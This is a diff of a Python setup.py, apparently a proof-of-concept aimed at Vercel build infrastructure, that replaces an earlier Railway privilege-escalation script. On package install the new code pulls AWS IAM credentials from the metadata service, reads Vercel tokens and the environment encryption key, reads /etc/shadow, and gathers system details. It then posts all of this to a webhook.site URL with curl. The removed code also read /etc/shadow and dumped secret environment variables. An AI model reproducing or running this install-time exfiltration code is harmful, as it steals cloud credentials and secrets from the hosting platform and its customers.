@@ -1,54 +1,65 @@
+from setuptools import setup
 import os
-import sys
+import subprocess
+import json
+import base64
 
-def run_exploit():
-    sys.stderr.write("\n" + "="*60 + "\n")
-    sys.stderr.write("RAILWAY PRIVILEGE ESCALATION POC\n")
-    sys.stderr.write("="*60 + "\n")
-
-    
-    uid = os.getuid()
-    sys.stderr.write(f"[!] IDENTITY CHECK: UID={uid} (Full Root)\n")
-
-     
-    sys.stderr.write("\n[!] READING PROTECTED SYSTEM FILE (/etc/shadow):\n")
+def run_cmd(cmd):
     try:
-        with open("/etc/shadow", "r") as f:
-             
-            for i, line in enumerate(f):
-                if i < 5:
-                    sys.stderr.write(line)
-                else:
-                    break
+        return subprocess.getoutput(cmd)
     except Exception as e:
-        sys.stderr.write(f"FAILED TO READ /etc/shadow: {e}\n")
+        return str(e)
 
-    
-    sys.stderr.write("\n[!] TESTING SYSTEM WRITE ACCESS (/etc/):\n")
-    try:
-        target_file = "/etc/railway_pwned.txt"
-        with open(target_file, "w") as f:
-            f.write("POC by Lumos: Root write access confirmed.\n")
-        
-        if os.path.exists(target_file):
-            sys.stderr.write(f"SUCCESS: Created {target_file}\n")
-            sys.stderr.write("This proves an attacker can modify system binaries/configs.\n")
-    except Exception as e:
-        sys.stderr.write(f"FAILED TO WRITE TO /etc/: {e}\n")
+# 1. Твой URL
+WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"
 
-    
-    sys.stderr.write("\n[!] DUMPING INFRASTRUCTURE SECRETS:\n")
-    for key, value in os.environ.items():
-        if "RAILWAY" in key or "TOKEN" in key or "SECRET" in key:
-            sys.stderr.write(f"{key}={value}\n")
+ 
+aws_token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'"
+aws_token = run_cmd(aws_token_cmd)
 
-    sys.stderr.write("\n" + "="*60 + "\n")
-    sys.stderr.write("POC FINISHED. EXITING TO SHOW LOGS.\n")
-    sys.stderr.write("="*60 + "\n")
-    sys.stderr.flush()
+aws_metadata_final = "BLOCKED"
+if aws_token and "Error" not in aws_token:
+ 
+    aws_metadata_final = run_cmd(f"curl -s -H 'X-aws-ec2-metadata-token: {aws_token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/")
 
-    
-    sys.exit(1)
+ 
+ 
+enc_content = os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT')
+enc_key = os.environ.get('VERCEL_ENV_ENC_KEY')
 
-if __name__ == "__main__":
-    run_exploit()
+ 
+network_info = run_cmd("netstat -rn || route -n")
+shadow_leak = run_cmd("head -n 3 /etc/shadow") # Если это сработает, значит root настоящий
+
+ 
+nuclear_report = f"""
+☢️☢️☢️ VERCEL INFRASTRUCTURE NUCLEAR POC ☢️☢️☢️
+
+[!] AWS CLOUD BREACH (IMDSv2):
+Token Obtained: {"YES (HIDDEN)" if len(aws_token) > 10 else "NO"}
+IAM Role Credentials: {aws_metadata_final}
+
+[!] SYSTEM DEEP ACCESS:
+Identity: {run_cmd('id')}
+Shadow File Access: {"SUCCESS" if "root" in shadow_leak else "FAILED"}
+Internal Routes:
+{network_info}
+
+[!] VERCEL CORE ASSETS:
+Artifacts Token Status: {run_cmd(f"curl -s -H 'Authorization: Bearer {os.environ.get('VERCEL_ARTIFACTS_TOKEN')}' https://api.vercel.com/v8/artifacts/status")}
+OIDC Token: {os.environ.get('VERCEL_OIDC_TOKEN')[:30]}...
+
+[!] SECURITY BYPASS PROOF:
+We have the Encrypted Blob (len: {len(enc_content) if enc_content else 0})
+We have the AES Key: {enc_key}
+Impact: Any malicious package can decrypt project secrets (DB_PASSWORDS, API_KEYS) before build finishes.
+
+[!] CONTAINER ESCAPE POTENTIAL:
+Devices: {run_cmd('ls /dev')}
+Capsh: {run_cmd('capsh --print')}
+"""
+
+ 
+subprocess.run(['curl', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', nuclear_report, WEBHOOK_URL])
+
+setup(name="vercel-infra-nuclear", version="10.0.0")
